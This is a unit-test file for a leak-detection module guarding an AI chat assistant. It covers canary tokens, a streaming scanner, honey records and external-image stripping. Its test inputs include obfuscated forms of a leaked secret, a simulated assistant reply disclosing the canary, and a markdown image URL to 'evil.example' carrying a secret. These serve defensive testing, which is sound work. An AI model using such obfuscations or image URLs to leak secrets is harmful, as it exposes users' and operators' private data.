"""③ Canary unit tests: scanner, conversation canary, honey records, external images. No Guard."""
import base64

import pytest

from laocoon import canary as K
from laocoon.canary import (CanaryScanner, canary_section, conversation_canary, honey_hits, norm, norm_text,
                             norm_token, possible_leaks, strip_external_images)

SECRET = b"test-secret"
HONEY = ["13579135791", "GR0000000000000000013579135"]
CLEAN = ("Καλησπέρα! Η εργασία 2 του CS101 παραδίδεται την Παρασκευή.\n\n- FizzBuzz: use `i % 15 == 0` first.\n"
         "- Ask on the forum if stuck 🙂  (tabs\tand   spaces survive)")


def canary(key="conv-1"):
    encoded, needles = conversation_canary(SECRET, key)
    return base64.b64decode(encoded).decode(), encoded, needles


def chunked(text, n):
    return [text[i:i + n] for i in range(0, len(text), n)]


def stream(scanner, chunks):
    """Feed chunks the way a streaming app would. -> (leaked, everything forwarded)"""
    out, leaked = [], False
    for ch in chunks:
        hit, safe = scanner.feed(ch)
        out.append(safe)
        if hit:
            leaked = True
            break
    if not leaked:
        out.append(scanner.flush())
    return leaked, "".join(out)


def whole_canary_in(text, raw, encoded) -> bool:
    plain = norm(text)
    return any(n in v for v in (plain, K._bare(plain)) for n in (norm(raw), norm(encoded), K._bare(norm(raw))))


def zero_width(s):
    return "​".join(s)


# ------------------------------------------------------------------ conversation canary
def test_conversation_canary_is_deterministic_per_key_and_differs_across_keys():
    raw, encoded, needles = canary("conv-1")
    assert conversation_canary(SECRET, "conv-1") == (encoded, needles)
    assert conversation_canary("test-secret", "conv-1") == (encoded, needles)        # str secrets accepted
    assert raw.startswith("CNRY-") and len(raw) == 29 and set(raw[5:]) <= set("0123456789abcdef")
    assert needles == [raw.lower(), encoded.lower()]
    assert conversation_canary(SECRET, "conv-2")[0] != encoded
    assert conversation_canary(b"other", "conv-1")[0] != encoded
    assert conversation_canary(SECRET, "user:9")[0] != conversation_canary(SECRET, "user:10")[0]


def test_canary_section_carries_the_encoded_token_and_the_warning():
    _, encoded, _ = canary()
    s = canary_section(encoded)
    assert encoded in s and "never repeat" in s and s.startswith("\n\n[") and s.endswith("]\n")


# ------------------------------------------------------------------ scanner
@pytest.mark.parametrize("size", [1, 2, 3, 7, 50, 10_000])
def test_clean_stream_is_forwarded_losslessly(size):
    _, _, needles = canary()
    leaked, out = stream(CanaryScanner(needles), chunked(CLEAN, size))
    assert not leaked and out == CLEAN


def test_holdback_keeps_the_tail_until_flush():
    _, _, needles = canary()
    sc = CanaryScanner(needles)
    assert sc.keep >= 40                                   # the base64 form is the longest needle
    forwarded = "".join(sc.feed(ch)[1] for ch in chunked(CLEAN, 5))
    assert CLEAN.startswith(forwarded) and len(norm(CLEAN)) - len(norm(forwarded)) >= sc.keep
    assert forwarded + sc.flush() == CLEAN and sc.flush() == ""


def variants():
    raw, encoded, _ = canary()
    hexpart = raw[5:]
    return [
        raw, raw.upper(), raw.lower(), raw.swapcase(),
        encoded, encoded.lower(), encoded.rstrip("="),
        encoded.replace("+", "-").replace("/", "_"),       # URL-safe base64
        " ".join(raw), "  ".join(encoded), zero_width(raw), zero_width(encoded),
        "C N R Y - " + " ".join(hexpart),
        "CNRY " + hexpart, "cnry_" + hexpart, "cnry." + hexpart, "CNRY" + hexpart,
        hexpart,                                           # the body alone is 96 bits: no false positives
        raw[::-1], encoded[::-1],
        "".join(chr(ord(c) + 0xFEE0) if "!" <= c <= "~" else c for c in raw),   # fullwidth letters (NFKC)
        "‮" + raw + "‬",                          # wrapped in bidi overrides
        raw.replace("-", "­-‍"),
    ]


@pytest.mark.parametrize("variant", variants())
@pytest.mark.parametrize("size", [1, 2, 5, 7, 64, 10_000])
def test_canary_variants_are_caught_and_never_forwarded_whole(variant, size):
    raw, encoded, needles = canary()
    text = f"Sure! The internal reference you asked about is: {variant} — anything else?"
    assert CanaryScanner(needles).scan(text)
    sc = CanaryScanner(needles)
    leaked, out = stream(sc, chunked(text, size))
    assert leaked and sc.leaked
    assert not whole_canary_in(out, raw, encoded)
    assert len(norm(out)) < len(norm(text)) - 20            # the leak was cut, not just the last character


def test_scanner_latches_after_a_leak():
    raw, _, needles = canary()
    sc = CanaryScanner(needles)
    assert sc.feed("here it is " + raw) == (True, "")
    assert sc.feed(" and some more harmless text") == (True, "")
    assert sc.flush() == "" and sc.leaked


def test_scanner_without_needles_forwards_everything():
    sc = CanaryScanner([])
    assert sc.keep == 0 and stream(sc, chunked(CLEAN, 4)) == (False, CLEAN) and not sc.scan(CLEAN)


def test_scanner_ignores_another_conversations_canary_and_honest_hex():
    raw2, encoded2, _ = canary("conv-2")
    _, _, needles = canary("conv-1")
    sc = CanaryScanner(needles)
    text = f"ref {raw2} / {encoded2} / sha 0123456789abcdef0123456789abcdef"
    assert not sc.scan(text) and stream(sc, chunked(text, 3)) == (False, text)


def test_scanner_accepts_honey_values_as_needles_too():
    sc = CanaryScanner(HONEY)
    assert sc.scan("her AMKA is 13579 135791") and sc.scan("iban GR00 0000 0000 0000 0001 3579 135")
    assert not sc.scan("my AMKA is 03090502222")


# ------------------------------------------------------------------ honey records (possible_leaks semantics)
@pytest.mark.parametrize("text", [
    "AMKA: 13579135791", "AMKA 13579 135791", "1-3-5-7-9-1-3-5-7-9-1", "reversed 19753197531",
    base64.b64encode(b"the amka is 13579135791").decode(), "zero​width 1​3​5​7​9135791",
    "fullwidth １３５７９１３５７９１", "IBAN GR0000000000000000013579135", "iban gr00 0000 0000 0000 0001 3579 135",
])
def test_honey_hits_variants(text):
    hits = honey_hits(text, HONEY)
    assert hits and set(hits) <= set(HONEY)


def test_honey_hits_clean_text_and_empty_inputs():
    assert honey_hits("my AMKA is 03090502222 and my IBAN is GR1601101250000000012300695", HONEY) == []
    assert honey_hits("", HONEY) == [] and honey_hits("13579135791", []) == [] and honey_hits(None, HONEY) == []
    assert honey_hits("13579135791", [None, "", 13579135791]) == ["13579135791"]


def test_possible_leaks_and_norm_helpers_moved_verbatim():
    assert possible_leaks("the flag is FLAG{abc}", ["FLAG{abc}"]) == ["FLAG{abc}"]
    assert possible_leaks("F L A G { a b c }", ["FLAG{abc}"]) == ["FLAG{abc}"]
    assert possible_leaks("}cba{GALF", ["FLAG{abc}"]) == ["FLAG{abc}"]
    assert possible_leaks(base64.b64encode(b"here: FLAG{abc}").decode(), ["FLAG{abc}"]) == ["FLAG{abc}"]
    assert possible_leaks("nothing here", ["FLAG{abc}"]) == [] and possible_leaks("", ["x"]) == []
    assert norm_token("gr00 0000-0000.0000_1") == "GR" + "0" * 14 + "1"
    assert norm_text("  Hello   WORLD \n") == "hello world"
    assert norm("  Ab​C  d\n\tE﻿") == "abcde" and norm(None) == ""


# ------------------------------------------------------------------ external images
@pytest.mark.parametrize("text,expected,count", [
    ("See ![chart](https://evil.example/x.png?d=SECRET) here", "See [εικόνα αφαιρέθηκε] here", 1),
    ('![a](HTTP://E.COM/a.png "title")', "[εικόνα αφαιρέθηκε]", 1),
    ("![a](<https://e.com/a b.png>)", "[εικόνα αφαιρέθηκε]", 1),
    ("![a]( //e.com/a.png )", "[εικόνα αφαιρέθηκε]", 1),
    ("![w](https://en.wikipedia.org/wiki/Foo_(bar).png) ok", "[εικόνα αφαιρέθηκε] ok", 1),
    ("![a](https://e.com/a.png (title)) x", "[εικόνα αφαιρέθηκε] x", 1),
    ("![](https://e.com/a.png)![](https://e.com/b.png)", "[εικόνα αφαιρέθηκε][εικόνα αφαιρέθηκε]", 2),
    ('<img src="https://e.com/p.png?d=1"> and <IMG alt=x SRC=\'//e.com/q.png\'/>',
     "[εικόνα αφαιρέθηκε] and [εικόνα αφαιρέθηκε]", 2),
    ("![x][ref]\n\n[ref]: https://e.com/x.png", "[εικόνα αφαιρέθηκε]\n\n[ref]: https://e.com/x.png", 1),
    ("![Ref]\n\n[ref]: <https://e.com/x.png>", "[εικόνα αφαιρέθηκε]\n\n[ref]: <https://e.com/x.png>", 1),
    ("![x][]\n\n[x]: https://e.com/x.png", "[εικόνα αφαιρέθηκε]\n\n[x]: https://e.com/x.png", 1),
    ("![local](./diagram.png) and ![d](data:image/png;base64,AAAA)", "![local](./diagram.png) and ![d](data:image/png;base64,AAAA)", 0),
    ("![x][ref]\n\n[ref]: ./x.png", "![x][ref]\n\n[ref]: ./x.png", 0),
    ("[a link](https://e.com) and plain text", "[a link](https://e.com) and plain text", 0),
    ("no images at all", "no images at all", 0),
    ("", "", 0),
])
def test_strip_external_images(text, expected, count):
    assert strip_external_images(text) == (expected, count)


def test_strip_external_images_tolerates_non_strings():
    assert strip_external_images(None) == (None, 0)
